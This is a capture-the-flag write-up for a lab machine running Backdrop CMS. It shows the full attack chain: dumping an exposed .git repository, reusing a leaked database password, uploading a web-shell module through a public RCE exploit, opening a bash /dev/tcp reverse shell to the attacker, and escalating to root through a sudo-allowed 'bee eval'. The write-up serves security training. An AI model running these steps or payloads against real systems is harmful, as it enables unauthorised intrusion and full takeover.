- we start with an nmap scan
```shell
nmap -A -T4 10.10.11.58
```
- We get the next result:
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

```
- We deal with a website on http (basic) but, we have a git repository, which is kinda interesting 
- So I look through the site but a lot of dead-ends

- Then I move onto the git repository and I want to fetch it on my machine so I use `Dumper` from `GitTools` package
```shell
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
```

- I dump everything in a new folder `/tmp/gitdump`
```shell
./gitdumper.sh http://10.10.11.58/.git /tmp/gitdump
```

- I go in that directory and I check it with
```
git checkout .
```
and a bunch of files appeared

- One in particular seemed interesting `settings.php`
- Going through it I get this:
```txt
 * Database configuration:
...
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

- so I get a user = `root`
- and a password = `BackDropJ2024DS2024`

- Searching even more I find in the `/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json` an email `tiffany@dog.htb`

- Now I have some credentials and I remember that there exists a login page 
- I try to login with the next credentials:
	- email: `tiffany@dog.htb`
	- password: `BackDropJ2024DS2024`
- WOILA, I AM IN
![[Pasted image 20250707142753.png]]

- Now that I am connected to the admin dashboard I can search for a lot of information about the web server
- I see that that the web server utilizes `backdrop cms` 
- Venturing further in the `http://10.10.11.58/?q=admin/reports/status` I find the version of `backdrop cms` which is `1.27.1`
- I use `searchsploit` to see if I find some exploit
```
searchsploit 
```
- AND lucky me, I found the perfect exploit:
```txt
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)               
found at: php/webapps/52021.py
```

- Lets transfer it so we can use it:
```
searchsploit -m /php/webapps/52021.py
```

- Give execution permissions
- and use it 
```shell
python3 52021.py http://10.10.11.58
```

- I got the next output:
```txt
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

- I go to the address where the exploit tells me to go to install the shell
after that I click on `Manual Installation`
![[Pasted image 20250707142905.png]]
- After that I get redirected here![[Pasted image 20250707143036.png]]

- The script gave me a `shell.zip` archive but I need and `archive.tar.gz` so lets converted it:
```shell
unzip shell.zip -d temporary
```
```
tar -czvf shell.tar.gz -C temporary .
```

- Now we select `shell.tar.gz` we get a successful installation
![[Pasted image 20250707143258.png]]

- And we go to `http://10.10.11.58/modules/shell/shell.php` where we got our shell 
![[Pasted image 20250707143418.png]]

- Now we open a listener on port 4444, to get a reverse shell:
	- On our machine: `nc -lvnp 4444`
	- we type in our shell `bash -c 'bash -i >& /dev/tcp/<your_IP>/4444 0>&1'`
- We got our shell![[Pasted image 20250707143621.png]]

- Lets see what users are on the server
```shell
cd /home
```
- we get `jobert` and `johncusack`

- If we venture into their directories we find `user.txt` in `/home/johncusack` which suggest that `johncusack` is our user
- Now we want to `ssh` into his account to get a connection
```shell
ssh johncusack@10.10.11.58
password: BackDropJ2024DS2024
```

- We are in and lets get the user flag:
```
cat user.txt
39e69d14217ef3e734fdaabe29ee762c
```

#### Root flag

- Let's see what we can `sudo`:
```shell
sudo -l
```
```txt
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

- If we try to run `/usr/local/bin/bee` we get a bunch of options
![[Pasted image 20250707144328.png]]
- We see that we have as global option `--root` where we have to specify the folder of the web server 
- By going through the root folder `/` we find the web server at `/var/www/html` 

- Now that we have the folder of the server let's find a command which can help us:![[Pasted image 20250707144534.png]]
- There it is command `eval` which evaluates PHP 
- So with a wonderful evaluation `"system('id');"` we can see if we get the root id:
```shell
sudo /usr/local/bin/bee --root="/var/www/html" eval "system('id');"
```
- The output:
```
uid=0(root) gid=0(root) groups=0(root)
```

- IT WORKS so lets get a reverse shell 
```shell
sudo /usr/local/bin/bee --root="/var/www/html" eval "system('/bin/bash');"
```
- We get the reverse shell as `root` so we go into `/root` to get the flag from `root.txt` 
![[Pasted image 20250707144907.png]]

